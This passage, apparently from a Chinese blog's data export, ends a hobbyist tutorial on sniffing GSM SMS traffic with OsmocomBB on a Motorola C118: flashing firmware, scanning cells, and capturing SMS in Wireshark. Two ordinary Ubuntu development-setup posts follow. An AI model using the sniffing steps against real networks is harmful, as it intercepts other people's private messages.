arm-开头的如下图所示就说明编译环境搞定了：\n\n[![屏幕快照 2013-11-06 06.43.44 PM](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM.png)](http://asset.creturn.com/asset/uploads/2013/11/屏幕快照-2013-11-06-06.43.44-PM.png)\n\n好了累了半死才把编译环境搞定，接下来下载 OsmocomBB 源码\n\n在source目录下执行下面两条命令：\n\n[shell]\ngit clone git://git.osmocom.org/osmocom-bb.git\ngit clone git://git.osmocom.org/libosmocore.git\n[/shell]\n\n先编译osmocom核心库文件,进入libosmocore 执行如下命令：\n\n[shell]\nautoreconf -i\n./configure\nmake\nsudo make install\n[/shell]\n\n然后进入osmocom/src下目录\n\ngit checkout --track origin/luca/gsmmap 切换到这个分支\n\n执行make命令\n\n如果不出意外你所需软件环境和固件都编译好了。Ubuntu12.04 默认能够识别FT232R所以不用装驱动。\n\n接下来链接硬件， FT232RL USB TO TTL 和 摩托的数据线链接注意上面对应的标识接入GND、RX、TX 所以不用担心接错，我也第一次摸板子。\n\n链接完成后需要注意，如果链接正常下载板上面的蓝色的灯和红色的灯都要亮，不然肯定是接触不良，\n\n我之前由于接触不良导致固件写入一半就会停止，或者包其他错误。所以这里需要特别注意。\n\n插入硬件后在虚拟机菜单中把接入下载板子的usb接口分配给虚拟机如图：\n\n[![QQ20131106-9](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-9.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-9.png)\n\n在终端中输入lsusb 如果驱动正常就能看到usb-serial\n\n看下分配前和分配后的区别如下图：\n\n[![QQ20131106-10](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-10.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-10.png)\n\n接下来我们写入固件到手机中，这里需要说明的一点，很多人说是刷入固件，导致很多人误认为是刷机，其实只是把\n\n固件加载到手机raw中执行而已，所以也不要担心输入固件后手机就不能用了。\n\n切换到 osmocom-bb/src/host/osmocon/目录 执行如下命令：\n\n[shell]\n/osmocon -m c123 -p /dev/ttyUSB0  ../../target/firmware/board/compal_e88/layer1.compalram.bin\n[/shell]\n\n这里同样需要说明下有的 -m 后面接的是 c123xor 区别是是否检测数据总和\n\n注意上面命令需要在关机下执行，然后短按开机键，注意不要长按不然就开机了\n\n如果不出意外就能看到如下图：\n\n[![QQ20131106-11](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-11.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-11.png)\n\n这里需要提醒下，由于买的手机都是二手的，所以接口处有可能会有松动，所以如果看到数据写入被取消就多试几次\n\n调整下接口看看是否有松动，我机会每次都要试4-5次才能正常写入固件，看到staring up 基本就成功了，同事可以看到\n\n手机上面也显示了 Layer 1 osmocom-bb 字样\n\n[![QQ20131106-12](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-12.png)\n\n](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-12.png)接下来在 /osmocom-bb/src/host/layer23/src/misc/ 目录执行  ./cell_log\n\n输出日志信息，在里面可以看到基站信息\n\n找到类似信息\n\ncell_log.c:248 Cell: ARFCN=117 PWR=-62dB MCC=460 MNC=01\n\n如下图：\n\n[![QQ20131106-13](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-13.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-13.png)\n\n记住ARFCN后面的编号\n\n然后在同样目录下输入下面命令把数据流导入本地4729端口\n\n[shell]\n\n./ccch_scan -i 127.0.0.1 -a 117 # 注意这里的117就是上面的ARFCN后面的编号\n\n[/shell]\n\n如下图：\n\n[![QQ20131106-14](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-14.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-14.png)\n\n接下来用wireshark 抓包，输入如下命令：\n\n[shell]\n\nsudo wireshark -k -i lo -f 'port 4729'\n\n[/shell]\n\n然后在wireshark里面过滤gsm_sms协议数据，里面就包含了短信数据\n\n[![QQ20131106-15](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-15.png)](http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-15.png)\n\n&nbsp;\n\n好了就到这里了，剩下的自己慢慢玩吧，做了一个视频演示：\n\n&nbsp;\n<embed src=\"http://player.youku.com/player.php/sid/XNjMwNjY5OTA0/v.swf\" allowFullScreen=\"true\" quality=\"high\" width=\"480\" height=\"400\" align=\"middle\" allowScriptAccess=\"always\" type=\"application/x-shockwave-flash\"></embed>\n\n高清版下载地址：[http://pan.baidu.com/s/1ACSOE](http://pan.baidu.com/s/1ACSOE)\n\n淘宝地址在这里就去掉了，给别人带来了“一些”麻烦， 需要买的直接在淘宝里面搜索相应的关键字就能找到。 修改日期：2013.12.1\n\n手机就随便在淘宝上找一家就行\n","slug":"radiowar-之osmocombb-sms-sniffer","updated":1421659126000,"excerpt":"<p>好久没写东西了，前几天看到Radiowar这个词的时候感觉有点意思，</p>\n<p>可能是因为之前写过War Driving 的文章对War很敏感吧.</p>\n<p>Radiowar指的是无线安全攻击，不过很多人听到无线攻击就和无线网络破解划等号了。</p>\n<p>其实Radiowar 包含所有无线电子设备如：2.4GHz网络、RFID、NFC等等.</p>\n<p>很多人现在都在玩Proxmark3 奈何成本过大，做个试验最少也得千把来块，自己对这个也仅仅是感兴趣，</p>\n<p>所以就从一些简单且Cheap的设备玩起，刚好最近看到有几个人发了GSM网络嗅探的文章，</p>\n<p>自己就弄些设备来玩，成本较低，一套设备下来100左右。</p>\n<p>设备清单：</p>\n<ol>\n<li>摩托罗拉 C118 (25块)</li>\n<li>FT232RL USB TO TTL (30元)</li>\n<li>摩托罗拉 Motorola C118专用数据连接线 (10块)</li>\n<li>MiniUSB 链接线(10元，这个大家手里应该都有)</li>\n</ol>\n<p>如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2013/11/QQ20131106-7.png\" alt=\"QQ20131106-7\"></a><br>","_id":"g6h22lvz123hf9hl","comments":true,"layout":"post","photos":[],"link":""},{"title":"ubuntu下eclipse+erlang+mongodb开发环境搭建","id":222,"date":1345046188000,"tags":[],"categories":["ng1ki7p1v08zbwrz"],"content":"<p>最近公司webGame项目中用到了Erlang+MongoDB，没办法项目需要那就学呗。</p>\n<p>学这个东西最起码得有环境吧，今天搭建开发环境就顺便记录一下，依然在ubuntu下进行开发。</p>\n<p>顺便说下，如果做开发，最好选择linux，因为很多环境在linux下搭建很方便。win下一般也会</p>\n<p>有相应的发法搭建，但是经常会遇到一些莫名其妙的问题。因此建议做开发的同学还是Linux下吧。</p>\n<p>好了不废话了，继续我们的环境搭建（Ubuntu下进行）：</p>\n<p>Mongodb 安装</p>\n<p>打开命令输入如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">sudo</span> apt-get install mongodb</div></pre></td></tr></table></figure>\n\n<p><a id=\"more\"></a><br>输入管理员密码后确认安装，然后等待安装结束。如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224239的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224239的屏幕截图.png\" alt=\"\" title=\"2012-08-15 22:42:39的屏幕截图\"></a></p>\n<p>网速快的花2-3分钟就装好了。然后我们检查下是否成功：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">pgrep mongo -l     //查看是否存在mongo的进行。为啥不看端口<span class=\"keyword\">...</span>初次安装我不知道端口号</div></pre></td></tr></table></figure>\n\n<p>可以看到已经存在Id为3913的mongod进程，说明已经启动运行了。如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224758的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224758的屏幕截图.png\" alt=\"\" title=\"2012-08-15 22:47:58的屏幕截图\"></a></p>\n<p>接着我们直接输入mongo进去瞅瞅这货长啥样，输入help我们可以看看帮信息，如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-225103的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-225103的屏幕截图.png\" alt=\"\" title=\"2012-08-15 22:51:03的屏幕截图\"></a></p>\n<p>可以看到我的版本现在是2.0.4</p>\n<p>好了，接下来就继续安装Erlang：</p>\n<p>ubuntu的好处就是基本上所有需要的东西只需要一句话就搞定，输入如下代码：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install erlang                   <span class=\"comment\">//是不是依旧那么简单，输入管理员密码然后确认安装，大概45M左右的程序包需要下载</span></div></pre></td></tr></table></figure>\n\n<p>等待了3分钟后安装完成。说实在的，第一次用还没看过文档，继续erlang看看有啥东西</p>\n<p>结果，我的猜想是错误的，其实应该是erl ….  输入erl -h  可以看到一部分帮助信息。如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231227的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231227的屏幕截图.png\" alt=\"\" title=\"2012-08-15 23:12:27的屏幕截图\"></a></p>\n<p>接下来就是给神器eclipse装erlang的插件了。其实我更愿意称呼vim为神器。但在项目管理等方面还是觉得eclipse是不错的选择</p>\n<blockquote>\n<p>打开eclipse -&gt; help -&gt; install new soft ，点击work with 旁边的Add添加erlang的一个Ide插件，地址为：</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">http</span>://erlide.org/update        <span class=\"comment\"> //erlide 一个erlang的ide插件</span></div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231934的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231934的屏幕截图.png\" alt=\"\" title=\"2012-08-15 23:19:34的屏幕截图\"></a></p>\n<p>点击确定等待几分钟后自动会更新插件信息</p>\n<p>如图所示，我是两个一起选择，下面的是ide的插件上面的看名字应该是一些插件和code那么一并装了。</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-232358的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-232358的屏幕截图.png\" alt=\"\" title=\"2012-08-15 23:23:58的屏幕截图\"></a></p>\n<p>一路下一步就行，中间需要同意他们的协议，要不不能继续。</p>\n<p>装玩后，file-&gt;new Project 可以看到里面已经有了erlang project如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-233218的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-233218的屏幕截图.png\" alt=\"\" title=\"2012-08-15 23:32:18的屏幕截图\"></a></p>\n<p>好了，环境也就搭建起来了~~</p>\n","source":"_posts/ubuntu下eclipseerlangmongodb开发环境搭建.md","raw":"title: \"ubuntu下eclipse+erlang+mongodb开发环境搭建\"\nid: 222\ndate: 2012-08-15 23:56:28\ntags: \ncategories: \n- 原创作品\n---\n\n最近公司webGame项目中用到了Erlang+MongoDB，没办法项目需要那就学呗。\n\n学这个东西最起码得有环境吧，今天搭建开发环境就顺便记录一下，依然在ubuntu下进行开发。\n\n顺便说下，如果做开发，最好选择linux，因为很多环境在linux下搭建很方便。win下一般也会\n\n有相应的发法搭建，但是经常会遇到一些莫名其妙的问题。因此建议做开发的同学还是Linux下吧。\n\n好了不废话了，继续我们的环境搭建（Ubuntu下进行）：\n\nMongodb 安装\n\n打开命令输入如下命令：\n\n```shell\nsudo apt-get install mongodb\n```\n<!--more-->\n输入管理员密码后确认安装，然后等待安装结束。如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224239的屏幕截图.png \"2012-08-15 22:42:39的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224239的屏幕截图.png)\n\n网速快的花2-3分钟就装好了。然后我们检查下是否成功：\n\n```shell\npgrep mongo -l     //查看是否存在mongo的进行。为啥不看端口...初次安装我不知道端口号\n```\n\n可以看到已经存在Id为3913的mongod进程，说明已经启动运行了。如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224758的屏幕截图.png \"2012-08-15 22:47:58的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-224758的屏幕截图.png)\n\n接着我们直接输入mongo进去瞅瞅这货长啥样，输入help我们可以看看帮信息，如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-225103的屏幕截图.png \"2012-08-15 22:51:03的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-225103的屏幕截图.png)\n\n可以看到我的版本现在是2.0.4\n\n好了，接下来就继续安装Erlang：\n\nubuntu的好处就是基本上所有需要的东西只需要一句话就搞定，输入如下代码：\n\n```shell\nsudo apt-get install erlang                   //是不是依旧那么简单，输入管理员密码然后确认安装，大概45M左右的程序包需要下载\n```\n\n等待了3分钟后安装完成。说实在的，第一次用还没看过文档，继续erlang看看有啥东西\n\n结果，我的猜想是错误的，其实应该是erl ....  输入erl -h  可以看到一部分帮助信息。如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231227的屏幕截图.png \"2012-08-15 23:12:27的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231227的屏幕截图.png)\n\n接下来就是给神器eclipse装erlang的插件了。其实我更愿意称呼vim为神器。但在项目管理等方面还是觉得eclipse是不错的选择\n\n>打开eclipse -> help -> install new soft ，点击work with 旁边的Add添加erlang的一个Ide插件，地址为：\n\n```shell\nhttp://erlide.org/update         //erlide 一个erlang的ide插件\n```\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231934的屏幕截图.png \"2012-08-15 23:19:34的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-231934的屏幕截图.png)\n\n点击确定等待几分钟后自动会更新插件信息\n\n如图所示，我是两个一起选择，下面的是ide的插件上面的看名字应该是一些插件和code那么一并装了。\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-232358的屏幕截图.png \"2012-08-15 23:23:58的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-232358的屏幕截图.png)\n\n一路下一步就行，中间需要同意他们的协议，要不不能继续。\n\n装玩后，file-&gt;new Project 可以看到里面已经有了erlang project如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-233218的屏幕截图.png \"2012-08-15 23:32:18的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-15-233218的屏幕截图.png)\n\n好了，环境也就搭建起来了~~\n","slug":"ubuntu下eclipseerlangmongodb开发环境搭建","updated":1421659126000,"excerpt":"<p>最近公司webGame项目中用到了Erlang+MongoDB，没办法项目需要那就学呗。</p>\n<p>学这个东西最起码得有环境吧，今天搭建开发环境就顺便记录一下，依然在ubuntu下进行开发。</p>\n<p>顺便说下，如果做开发，最好选择linux，因为很多环境在linux下搭建很方便。win下一般也会</p>\n<p>有相应的发法搭建，但是经常会遇到一些莫名其妙的问题。因此建议做开发的同学还是Linux下吧。</p>\n<p>好了不废话了，继续我们的环境搭建（Ubuntu下进行）：</p>\n<p>Mongodb 安装</p>\n<p>打开命令输入如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">sudo</span> apt-get install mongodb</div></pre></td></tr></table></figure>\n\n<p>","_id":"ckuiqj1lr7mg43jy","comments":true,"layout":"post","photos":[],"link":""},{"title":"Ubuntu下的PHP开发环境架设","id":198,"date":1344869767000,"tags":["ml6i63k0mlf18eyy","6973km6kad7polie","ar6b10znzennvxrm"],"categories":["ng1ki7p1v08zbwrz","3ew512opa4s8w18i"],"content":"<p>今天重新装了ubuntu那么就吧过程记录下。</p>\n<p>打开终端，也就是命令提示符。</p>\n<p>我们先来最小化组建安装，按照自己的需求一步一步装其他扩展。命令提示符输入如下命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-get <span class=\"operator\"><span class=\"keyword\">install</span> apache2 php5-mysql libapache2-<span class=\"keyword\">mod</span>-php5 mysql-<span class=\"keyword\">server</span></span></div></pre></td></tr></table></figure>\n\n<p>上面的命令是最小化组建安装amp也就是apache2 ,php5 和 mysql 在加上一个php的mysql扩展</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:23:50的屏幕截图\"></a><br><a id=\"more\"></a><br>上面命令输入完成后提示输入密码，成功后询问你是否安装y继续。然后就等待着完成安装…</p>\n<p>安装的时候第一次出现一个这样的界面，意思是让你设置root管理员密码，重复一次后继续..</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003043的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003043的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:30:43的屏幕截图\"></a></p>\n<p>安装完成后地址栏输入localhost回车后如果正常安装成功可以看到一段文字如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003425的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003425的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:34:25的屏幕截图\"></a></p>\n<p>我们写个PHP的探针脚本试试看看PHP有没有被支持操作如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># sudo touch /var/www/test.php            //默认apache网站root目录是/var/www</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># sudo vim /var/www/test.php             //用自己习惯的编辑器编辑如果不会用vim 可以用gedit提供vim命令</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"preprocessor\">&lt;?php</span></div><div class=\"line\">phpinfo()               <span class=\"comment\">//php探针脚本，就一句话</span></div><div class=\"line\"><span class=\"preprocessor\">?&gt;</span></div></pre></td></tr></table></figure>\n\n<p>如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004005的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004005的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:40:05的屏幕截图\"></a></p>\n<p>然后我们访问localhost/test.php看看能否运行，如果正常的花就可以看到如下图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004207的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004207的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:42:07的屏幕截图\"></a></p>\n<p>看到这个至少你的php环境已经搭建成功了，然后自己选择自己需要的组建。打开命令提示符输入下面命令：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install php5    <span class=\"comment\">//然后按tab键  可以看到如下php扩展</span></div></pre></td></tr></table></figure>\n\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004439的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004439的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:44:39的屏幕截图\"></a></p>\n<p>像我自己就会安装如下几个组建：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo apt-<span class=\"keyword\">get</span> install php5-gd php5-curl php5-xdebug</div><div class=\"line\"></div><div class=\"line\">gd                     <span class=\"comment\">//图库，如生成验证码，处理图片都离不开它</span></div><div class=\"line\"></div><div class=\"line\">curl                <span class=\"comment\">//支持ftp，http等等协议。用起来很方便</span></div><div class=\"line\"></div><div class=\"line\">xdebug        <span class=\"comment\">//装这个配合eclipse进行断点调试相当爽~~</span></div></pre></td></tr></table></figure>\n\n<p>其它的根据项目需要自行添加。</p>\n<p>自己还有个习惯就是基本上从来不是用默认/var/www路径，自己一般定义在用户目录下</p>\n<p>如我的站点目录会配置在/home/return/workspace/web  目录下，这样归档起来比较方便</p>\n<p>修改站点目录方法,打开</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">vim <span class=\"regexp\">/etc/</span>apache2<span class=\"regexp\">/sites-enabled/</span><span class=\"number\">0</span>XXXX   <span class=\"comment\">//在sites-enabled/0xx开头的文件里面有默认站点配置信息</span></div></pre></td></tr></table></figure>\n\n<p>用编辑器打开:vim(或者gedit) /etc/apache2/sites-enabled/0xxx //0xxx指的是以0开头的那个文件<br>如图：<br><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-005858的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-005858的屏幕截图.png\" alt=\"\" title=\"2012-08-14 00:58:58的屏幕截图\"></a></p>\n<p>修改完成保存后，重新启动一次apache 让其加载刚才修改的配置文件</p>\n<p>如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-011716的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-011716的屏幕截图.png\" alt=\"\" title=\"2012-08-14 01:17:16的屏幕截图\"></a></p>\n<p>然后在你的用户目录下的workspac/web下面写个php文件测试下看看是否正常。</p>\n<p>当然还有最后一个配置就是虚拟目录，如果经常输入localhost或者一些项目中需要配置一些域名，而测试的话又经常需要改来改去的</p>\n<p>因此我是习惯性的在hosts做本地域名解析，然后绑定虚拟目录。例如test.com 是我们项目用到的域名，那么首先修改hosts文件做本地解析</p>\n<p>命令和内容如下：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">sudo vim(或者gedit) <span class=\"regexp\">/ect/</span>hosts                   <span class=\"comment\">//本地域名解析就是靠它的</span></div></pre></td></tr></table></figure>\n\n<p>在文件中加入 127.0.0.1  test.com 如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-013902的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-013902的屏幕截图.png\" alt=\"\" title=\"2012-08-14 01:39:02的屏幕截图\"></a></p>\n<p>然后在/etc/apache2/sites-enabled/下面建立一个名为www.test.com的文件，最好直接复制一份0xxx开头的配置文件做修改就行</p>\n<p>取名为www.test.com方便识别和辨认。apache默认会加载/etc/apache2/sites-enabled目录下的所有配置文件</p>\n<p>文件内容如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014154的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014154的屏幕截图.png\" alt=\"\" title=\"2012-08-14 01:41:54的屏幕截图\"></a></p>\n<p>注意：</p>\n<blockquote>\n<p>SeverName就是你要绑定的域名DocumentRoot是要绑定的目录，我直接绑定了/home/return/workspace/web/test文件夹</p>\n</blockquote>\n<p>如果不写入serverName的话test.com是无法解析到/home/return/workspace/web/test目录的</p>\n<p>在里面加入一个php探针文件如图：</p>\n<p><a href=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014604的屏幕截图.png\" target=\"_blank\" rel=\"external\"><img src=\"http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-014604的屏幕截图.png\" alt=\"\" title=\"2012-08-14 01:46:04的屏幕截图\"></a></p>\n<p>可以看到已经解析到对应的目录了。好了基本配置就这写，每个人的使用习惯和风格不一样，自己用多了就有了</p>\n<p>自己的使用习惯了，包括自己会了简化一些工作写一些自己的实用脚本等等。</p>\n","source":"_posts/ubuntu下都php开发环境架设.md","raw":"title: \"Ubuntu下的PHP开发环境架设\"\nid: 198\ndate: 2012-08-13 22:56:07\ntags: \n- apache\n- php\n- ubuntu\ncategories: \n- 原创作品\n- 技术文章\n---\n\n今天重新装了ubuntu那么就吧过程记录下。\n\n打开终端，也就是命令提示符。\n\n我们先来最小化组建安装，按照自己的需求一步一步装其他扩展。命令提示符输入如下命令：\n\n```shell\nsudo apt-get install apache2 php5-mysql libapache2-mod-php5 mysql-server\n```\n\n上面的命令是最小化组建安装amp也就是apache2 ,php5 和 mysql 在加上一个php的mysql扩展\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png \"2012-08-14 00:23:50的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-002350的屏幕截图.png)\n<!--more-->\n上面命令输入完成后提示输入密码，成功后询问你是否安装y继续。然后就等待着完成安装...\n\n安装的时候第一次出现一个这样的界面，意思是让你设置root管理员密码，重复一次后继续..\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003043的屏幕截图.png \"2012-08-14 00:30:43的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003043的屏幕截图.png)\n\n安装完成后地址栏输入localhost回车后如果正常安装成功可以看到一段文字如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003425的屏幕截图.png \"2012-08-14 00:34:25的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-003425的屏幕截图.png)\n\n我们写个PHP的探针脚本试试看看PHP有没有被支持操作如下：\n\n```php\n\n# sudo touch /var/www/test.php            //默认apache网站root目录是/var/www\n\n# sudo vim /var/www/test.php             //用自己习惯的编辑器编辑如果不会用vim 可以用gedit提供vim命令\n\n<?php\nphpinfo()               //php探针脚本，就一句话\n?>\n\n```\n\n如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004005的屏幕截图.png \"2012-08-14 00:40:05的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004005的屏幕截图.png)\n\n然后我们访问localhost/test.php看看能否运行，如果正常的花就可以看到如下图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004207的屏幕截图.png \"2012-08-14 00:42:07的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004207的屏幕截图.png)\n\n看到这个至少你的php环境已经搭建成功了，然后自己选择自己需要的组建。打开命令提示符输入下面命令：\n\n```shell\nsudo apt-get install php5    //然后按tab键  可以看到如下php扩展\n```\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004439的屏幕截图.png \"2012-08-14 00:44:39的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-004439的屏幕截图.png)\n\n像我自己就会安装如下几个组建：\n\n```shell\nsudo apt-get install php5-gd php5-curl php5-xdebug\n\ngd                     //图库，如生成验证码，处理图片都离不开它\n\ncurl                //支持ftp，http等等协议。用起来很方便\n\nxdebug        //装这个配合eclipse进行断点调试相当爽~~\n```\n\n其它的根据项目需要自行添加。\n\n自己还有个习惯就是基本上从来不是用默认/var/www路径，自己一般定义在用户目录下\n\n如我的站点目录会配置在/home/return/workspace/web  目录下，这样归档起来比较方便\n\n修改站点目录方法,打开\n\n```shell\nvim /etc/apache2/sites-enabled/0XXXX   //在sites-enabled/0xx开头的文件里面有默认站点配置信息\n```\n\n用编辑器打开:vim(或者gedit) /etc/apache2/sites-enabled/0xxx //0xxx指的是以0开头的那个文件\n如图：\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-005858的屏幕截图.png \"2012-08-14 00:58:58的屏幕截图\")](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-005858的屏幕截图.png)\n\n修改完成保存后，重新启动一次apache 让其加载刚才修改的配置文件\n\n如图：\n\n[![](http://asset.creturn.com/asset/uploads/2012/08/2012-08-14-011716的屏幕截图.png \"2012-08-14 